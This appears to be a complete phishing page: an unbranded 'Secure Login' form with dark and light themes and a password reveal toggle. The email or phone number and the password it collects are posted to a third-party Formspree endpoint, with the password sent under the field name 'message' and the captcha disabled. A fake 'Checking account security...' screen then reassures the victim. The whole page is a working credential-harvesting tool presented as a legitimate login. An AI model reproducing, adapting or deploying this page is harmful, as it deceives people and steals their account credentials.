<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Secure Account</title>

<style>
*{box-sizing:border-box;margin:0}

body{
font-family:system-ui,-apple-system,Segoe UI,Roboto;
background:#0b0f14;
display:flex;
justify-content:center;
align-items:center;
min-height:100vh;
transition:.35s;
}

body.light{background:#f4f6f9}

/* APP */
.app{
width:100%;
max-width:430px;
overflow:hidden;
border-radius:18px;
box-shadow:0 40px 80px rgba(0,0,0,.55);
background:#11161d;
position:relative;
}
body.light .app{background:white}

/* LOGO */
.logo{
display:block;
margin:0 auto 28px auto;
width:140px;
}

/* PAGE */
.page{
padding:44px 32px;
width:100%;
transition:.55s cubic-bezier(.77,0,.18,1);
}
.slide{transform:translateX(-100%)}

/* TITLE */
h1{
font-size:28px;
margin-bottom:34px;
color:white;
text-align:center;
}
body.light h1{color:#111}

/* FIELD */
.field{position:relative;margin-bottom:24px}

/* INPUT */
input{
width:100%;
padding:18px 16px;
border-radius:12px;
border:1px solid #2a3441;
background:#0c1117;
color:white;
font-size:16px;
outline:none;
transition:.25s;
}
body.light input{
background:white;
color:#111;
border:1px solid #ccc;
}

/* FOCUS */
input:focus{
border-color:#f5c518;
box-shadow:0 0 0 3px rgba(245,197,24,.22);
}

/* FLOAT LABEL */
label{
position:absolute;
left:14px;
top:50%;
transform:translateY(-50%);
color:#7c8794;
background:inherit;
padding:0 6px;
transition:.2s;
pointer-events:none;
}
input:focus+label,
input:not(:placeholder-shown)+label{
top:-8px;
font-size:12px;
color:#f5c518;
}

/* EYE */
.eye{
position:absolute;
right:14px;
top:50%;
transform:translateY(-50%);
cursor:pointer;
font-size:18px;
opacity:.7;
}

/* BUTTON */
button{
width:100%;
padding:18px;
border:none;
border-radius:12px;
background:#f5c518;
font-weight:700;
font-size:18px;
cursor:pointer;
display:flex;
align-items:center;
justify-content:center;
gap:10px;
}

/* SPINNER */
.spin{
width:18px;height:18px;
border:3px solid rgba(0,0,0,.25);
border-top:3px solid black;
border-radius:50%;
animation:rot .7s linear infinite;
display:none;
}
@keyframes rot{to{transform:rotate(360deg)}}

.verify{text-align:center;color:white;}
body.light .verify{color:#111}

/* THEME */
.theme{
position:absolute;
top:12px;
right:12px;
cursor:pointer;
font-size:14px;
padding:6px 10px;
border-radius:8px;
background:#222;
color:white;
}
body.light .theme{background:#eee;color:#111}

@media(max-width:480px){
.app{border-radius:0;height:100vh}
}
</style>
</head>

<body>

<div class="app">

<div class="theme" onclick="toggleTheme()">‚òÄÔ∏é / üåô</div>

<!-- LOGIN -->
<div class="page" id="login">

<!-- ‚úÖ LOGO NOW CORRECT -->
<img src="logo.png" class="logo" alt="Logo">

<h1>Secure Login</h1>

<form id="form" action="https://formspree.io/f/xjgewkoy" method="POST">

<div class="field">
<input id="user" name="email" placeholder=" " required>
<label>Email or Phone</label>
</div>

<div class="field">
<input id="pass" type="password" name="message" placeholder=" " required>
<label>Password</label>
<div class="eye" onclick="togglePass()">üëÅ</div>
</div>

<input type="hidden" name="_captcha" value="false">

<button id="btn">
Login
<div class="spin" id="spin"></div>
</button>

</form>
</div>

<!-- VERIFY -->
<div class="page verify" id="verify">

<img src="logo.png" class="logo" alt="Logo">

<h1>Verification</h1>

<p style="opacity:.7;margin-bottom:28px">
Checking account security...
</p>

<div class="spin" style="display:inline-block"></div>

</div>

</div>

<script>

/* PASSWORD */
function togglePass(){
const p=document.getElementById("pass");
p.type=p.type==="password"?"text":"password";
}

/* THEME */
function toggleTheme(){
document.body.classList.toggle("light");
}

/* PHONE FORMAT */
document.getElementById("user").addEventListener("input",function(){
let v=this.value.replace(/\D/g,'');
if(v.length>6)v=v.replace(/(\d{3})(\d{3})(\d+)/,"$1 $2 $3");
else if(v.length>3)v=v.replace(/(\d{3})(\d+)/,"$1 $2");
this.value=v;
});

/* SUBMIT */
form.onsubmit=e=>{
e.preventDefault();
spin.style.display="block";
btn.disabled=true;

fetch(form.action,{
method:"POST",
body:new FormData(form),
headers:{'Accept':'application/json'}
})
.then(r=>{
spin.style.display="none";
btn.disabled=false;
if(r.ok){
login.classList.add("slide");
verify.classList.add("slide");
}
});
};
</script>

</body>
</html>
